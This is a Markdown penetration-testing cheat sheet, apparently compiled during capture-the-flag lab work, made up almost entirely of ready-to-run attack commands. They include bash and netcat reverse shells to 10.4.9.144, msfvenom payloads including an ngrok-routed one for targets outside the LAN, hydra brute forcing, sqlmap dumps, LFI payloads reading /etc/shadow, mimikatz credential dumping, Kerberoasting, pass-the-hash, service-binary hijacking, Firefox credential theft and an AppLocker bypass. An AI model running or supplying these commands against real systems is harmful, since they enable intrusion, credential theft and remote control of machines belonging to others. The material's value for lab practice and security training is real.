# Cheat Sheet

color word red using grep

```
man nikto | grep --color -P "host|"
```

rdp
```
xfreerdp /u:admin /p:password /v:10.10.52.82
```

ssh tunnel

```
ssh -L 9000:172.17.0.2:8080 aubreanna@10.10.188.199
```
kill process on port
```
fuser -k 7777/tcp
```

## Enumeration

```
./nmapAutomator.sh 10.10.10.10 all
```
webscan
```
nikto -host 10.10.200.161
```

nikto with creds
```
nikto -h http://10.10.183.26:1234/manager/html -id bob:bubbles
```

owasp-zap scanner
```
zaproxy
```

linux scan
```
enum4linux -a 10.10.26.102 | tee enum4linuxOutput.log
```

wordpress scan
```
wpscan --url blog.thm --enumerate u
```

wordpress brute force
```
wpscan --url http://10.10.70.68/blog/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

joomla scan

```
perl /home/kali/Documents/joomscan/joomscan.pl -u http://10.10.52.48
```

sudo masscan -e tun0 -p1-65535,U:1-65535 10.10.1.109 --rate=1000 (quick open port scan)

## FTP

use FTP to copy files onto box
```
scp linpeas.sh jan@10.10.122.69:/dev/shm
```

## mysql 

connect to mysql using password (root:hello)
```
mysql -h 10.10.28.115 -uroot -phello
```
after connecting, display all databases
```
show databases;
```
select the database called "data"
```
use data;
```
show tables in database
```
show tables;
```

return all from the table called "USERS"
```
select * from USERS;
```

## sql injection

check if a field is vulnerable to sql injection
get the format of "--data" from brupsuite
```
sqlmap -u 10.10.115.80/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --batch
```
return users from the "users" table
```
sqlmap -u 10.10.87.14/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --dbms=mysql 5.02 --batch -D social --columns -T users --dump
```

run sqlmap using burp request data saved to txt file #--dbms=sqlite
```
sqlmap -r request.txt --dbms=mysql --dump 
```

## LFI

simple LFI
```
http://10.10.58.44/get-file/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow
```
apply filter to encode base64, bypass runtime errors
```
http://10.10.109.75/?view=php://filter/convert.base64-encode/resource=dog../../index
```

## mountd (mount NFS drive)

show the avaliable directory to mount
```
/sbin/showmount -e 10.10.10.10 
```

make a directory and mount drive
```
sudo mkdir /mnt/thm
mount 10.10.10.10:/opt/files /mnt/thm
```

unmount the drive after finishing
```
sudo umount -f -l thm
```

## gobuster

standard wordlist
```
gobuster dir -u http://ip:port -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30
```
short word list
```
gobuster dir -u http://ip:port -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 
```

wfuzz
```
wfuzz -c -z file,wordlist http://10.10.106.25/api/site-log.php?date=FUZZ
```

## crack passwords

crack web login portal password
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect" 
```

crack wordpress login password on wp-login
```
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.67.83 -t 4 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=incorrect" (wordpress)
```

crack http/webdav password
```
hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.187.219 http-get /protected -t 4 -V
```

crack password for ssh
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 ssh
```

crack password for ftp
```
hydra -l Queen -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 ftp
```

crack password for zip
```
fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v ./christmaslists.zip (zip password)
```
crack hash, (-m) is the hash id, google hash id

eg. sha512($pass.$salt)
m = 1710
hash format = "hashedPass:salt"
```
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt --force 
```

crack hash with john
```
/usr/sbin/john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Encryption

decrypt gpg
```
pg -d note1.txt.gpg 
```
extract stenography
```
steghide extract -sf ./TryHackMe.jpg
```
crack stenography password using wordlist
```
/home/kali/.local/bin/stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt
```
return meta data
```
exiftool ./tryHackMe.jpg
```

check for hidden files, then extract
```
binwalk cutie.png
binwalk cutie.png -e 
```

asymmetric decryption using private key
```
openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out file.txt
```

## reverse ssh tunnel

start tunnel
```
ssh -L 10000:localhost:10000 agent47@10.10.209.11
```

go to localhost:10000 to access service

## reverse shell 

```
bash -i >& /dev/tcp/10.4.9.144/1234 0>&1
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.9.144 1234 >/tmp/f
```

generate reverse shell payload using msfvenom (execute this cmd in telnet session to get reverse shell)

```
msfvenom -p cmd/unix/reverse_netcat lhost=10.4.9.144 lport=4444 R
```

generate reverse shell windows exe
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.9.144 LPORT=1234 -e x86/shikata_ga_nai -f exe -o shell.exe
```

generate meterpreter reverse shell exe
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.9.144 LPORT=1234 -f exe -o reverseShell.exe
```

## listen for reverse shell

on local machine
```
netcat -lvnp 1234
```

listen for normal shell
```
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set lhost 10.4.9.144
set lport 4443
run -j
```

listen for meterpreter shell
```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.4.9.144 
set LPORT 1234 
run -j
```

upgrade shell
```
python -c "import pty; pty.spawn('/bin/bash')"

control+z

stty raw -echo

fg

press enter a few times

export TERM=xterm
```

## crack passwords with John

### Private Key

convert key to john format and crack private key password
```
/usr/share/john/ssh2john.py key > forjohn
/usr/sbin/john forjohn --wordlist=/usr/share/wordlists/rockyou.txt
```

ssh in using private key
```
chmod 600 key
ssh -i key kay@10.10.122.69
```

### crack /etc/shadow

copy hashes from /etc/shadow to text file, one hash per line

crack all hashes in file
```
/usr/sbin/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### crack zip password
```
/usr/sbin/zip2john 8702.zip > output
sudo john output
```

### remove john cache
```
rm /home/kali/.john/john.pot
```

## upload files to box

host on own computer
```
sudo python -m SimpleHTTPServer 8000
```

get on box
```
wget http://10.4.9.144:8000/linpeas.sh
```

use curl on box if wget is not avaliable 
```
curl 10.4.9.144:8000/linpeas.sh > linpeas.sh
```

on windows machine
```
powershell -c wget "http://10.4.9.144:8080/winPEAS.exe" -outfile "winPEAS.exe"

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.9.144:8000/reverseShell.exe','reverseShell.exe')"

powershell -c "Invoke-WebRequest -Uri 'http://10.4.9.144:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
```

## download files from box

on own machine
```
scp james@10.10.165.113:Alien_autospy.jpg /home/kali/Downloads
```

if we don't have credentials use netcat

listen from our machine
```
netcat -lnvp 8765 > suspicious.pcapng
```
send file from remote
```
netcat 10.4.9.144 8765 -w 4 < suspicious.pcapng
```

## Active Directory

copy exe files here to bypass applocker

```
C:\Windows\System32\spool\drivers\color
```

enumerate users - requires wordlist of usernames

```
./kerbrute userenum --dc 10.10.4.164 -d spookysec.local /home/kali/Downloads/userlist.txt 
```

harvest TGT on domain controller
```
rubeus.exe harvest /interval:30
```

bruteforce passwords with rubeus
```
Rubeus.exe brute /password:Password1 /noticket
```

kerberoast and crack hash
```
Rubeus.exe kerberoast
hashcat -m 13100 hash.txt Pass.txt --force
```

asproast and crack hash
```
Rubeus.exe asreproast
# Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
hashcat -m 18200 hash.txt Pass.txt --force
```

dump TGT from LSASS memory
```
mimikatz
sekurlsa::tickets /export
```
dump hash
```
mimikatz # lsadump::lsa /patch
hashcat -m 1000 <hash> rockyou.txt
```

dump NTLM hash of admin account
```
mimikatz # lsadump::lsa /inject /name:Administrator
```


Which user account can you query a ticket from with no password?
```
GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.4.164
```

enum shares on active directory - no password required
```
smbclient -L 10.10.4.164 
```

enum shares as user - requires password
```
smbclient -L 10.10.4.164 --user svc-admin
```

connect to share as user- requires password
```
smbclient //10.10.4.164/backup --user svc-admin
```

dump all hashes - requires password
```
secretsdump.py backup@10.10.4.164 -just-dc
```

pass the hash 
```
evil-winrm -i 10.10.4.164 -u Administrator -H e4876a80a723612986d7609aa5ebc12b
```
## Assembly

start debug mode 
```
r2 -d <program>
```

analyze the program
```
aa
```

find a list of the functions
```
afl
```

examine main function
```
pdf @main
```

search for main function 
```
s  main
```

view disassembly
```
pd
```

break point 
```
db <address value>
```

run until next break point
```
dc
```

print register values
```
dr <register>
```

## XXS

test for XXS
```
<script>alert('xss')</script>
```

## Windows Priv esc

in meterpreter session upload powerup and execute scan

```
upload /home/kali/Documents/PowerUp.ps1
load powershell
powershell_shell
. ./PowerUp.ps1
Invoke-AllChecks
```

identified service that canRestart and modifiable
```
ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

```

create reverse shell exe with msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.9.144 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```


in meterpreter setup reverse windows tcp listener
```
use exploit/multi/handler
set payload windows/shell/reverse_tcp #windows/meterpreter/reverse_tcp
set lhost 10.4.9.144
set lport 4443
run -j
```

stop service
```
sc stop AdvancedSystemCareService9
```

in meterpreter session, upload exe and copy into directory
```
upload ASCService.exe
copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

start service
```
sc start AdvancedSystemCareService9
```

## impersonate windows tokens

in meterpreter 

```
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators
```

## buffer overflow

generate cyclic pattern to find offset to EIP register
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 900
```

find bad chars -a is ESP register
remember to set EIP to random value during check
```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a 019EFA30
```


find return address
```
!mona jmp -r esp -cpb "\x00\x04\x05\x3e\x3f\xe1\xe2"
```

generate payload
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.9.144 LPORT=1234 EXITFUNC=thread -b "\x00\x04\x05\x3e\x3f\xe1\xe2" -f c
```

## Nessus

start
```
/sbin/service nessusd start
```

stop
```
/sbin/service nessusd stop
```

## attacking outside of LAN

start ngrok
```
./ngrok tcp 9999
```

generate payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19034 -f exe > payload.exe
```

listen from msfconsole
```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 0.0.0.0 set 
LPORT 9999 
run -j
```

## firefox decrypt

check firefox is installed download creds from meterpreter session
```
run post/windows/gather/enum_applications
run post/multi/gather/firefox_creds
```
rename the files to actual file names

run firefox decrypt
```
/home/kali/Documents/firefox_decrypt/firefox_decrypt.py /home/kali/Downloads/loot/
```



## CheckList


<details>
<summary>Login Web Page</summary>
  crack password using hydra<br>
  use SQL injection to bypass login<br>
  use cookie to login<br>
  check source of login page<br>
</details>

<details>
<summary>FTP</summary>
  login using anonymous account<br>
  ls -la<br>
  use the "put" command to upload reverse shell<br>
</details>

<details>
<summary>Priv Esc</summary>
  sudo -l<br>
  linpeas.sh<br>
  pspy64 - check cron jobs that linpeas might miss<br>
</details>
